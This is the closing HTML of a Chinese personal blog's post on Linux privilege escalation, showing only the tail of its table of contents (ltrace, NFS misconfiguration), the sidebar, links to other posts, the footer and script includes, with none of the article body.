class="toc-number">1.7.5.</span> <span class="toc-text"> ltrace 命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-nfs%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E6%8F%90%E6%9D%83"><span class="toc-number">1.8.</span> <span class="toc-text"> 8. NFS 配置错误导致的提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nfs"><span class="toc-number">1.8.1.</span> <span class="toc-text"> NFS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.8.2.</span> <span class="toc-text"> 安全问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.8.3.</span> <span class="toc-text"> 利用</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="N1U"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">N1U</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">17</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">15</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xVjY=" title="https:&#x2F;&#x2F;github.com&#x2F;N1V6"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>链接</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2025/01/07/xss%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2025/01/12/%E5%88%A9%E7%94%A8AI%E5%BC%80%E5%8F%91%E8%83%8C%E5%8D%95%E8%AF%8D%E6%8F%92%E4%BB%B6/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/11/24/%E3%80%8Eweekly%E3%80%8F%E5%85%B3%E4%BA%8E%E6%B8%B8%E6%88%8F/" title="『weekly』《咒》《女鬼桥》《还愿》关于恐怖游戏">『weekly』《咒》《女鬼桥》《还愿》关于恐怖游戏</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/01/07/xss%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" title="xss综合利用姿势">xss综合利用姿势</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/11/15/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" title="文件读取利用姿势">文件读取利用姿势</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/11/16/JavaScript%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="JavaScript代码审计">JavaScript代码审计</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/12/22/%E3%80%8Eweekly%E3%80%8F%E8%B1%86%E5%8C%85%E4%B8%8E%E9%9A%90%E7%A7%81/" title="『weekly』豆包与个人隐私">『weekly』豆包与个人隐私</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/01/12/%E5%88%A9%E7%94%A8AI%E5%BC%80%E5%8F%91%E8%83%8C%E5%8D%95%E8%AF%8D%E6%8F%92%E4%BB%B6/" title="『weekly』墨墨背单词浏览器插件开发 prompt">『weekly』墨墨背单词浏览器插件开发 prompt</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/05/20/%E5%85%B3%E4%BA%8E%E6%88%91%E7%9A%84%E7%88%B1%E6%83%85/" title="关于我的爱情">关于我的爱情</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/12/01/%E3%80%8Eweekly%E3%80%8F%E5%85%B3%E4%BA%8E%E8%87%AA%E6%88%91%E6%84%9F%E5%8A%A8/" title="『weekly』入冬 模型 关于自我感动">『weekly』入冬 模型 关于自我感动</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/12/15/%E3%80%8Eweekly%E3%80%8F%E5%85%B3%E4%BA%8E%E9%BB%91%E7%A5%9E%E8%AF%9D%E4%B8%8ETGA/" title="『weekly』黑神话与TGA">『weekly』黑神话与TGA</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/12/29/%E3%80%8Eweekly%E3%80%8F2024%E6%9C%80%E5%90%8E%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="『weekly』2024最后一篇博客">『weekly』2024最后一篇博客</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">N1U @ N1V</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2025/01/10/Linux权限提升/',
+    favicon: {
+      show: "欢迎回来",
+      hide: "N1V6"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
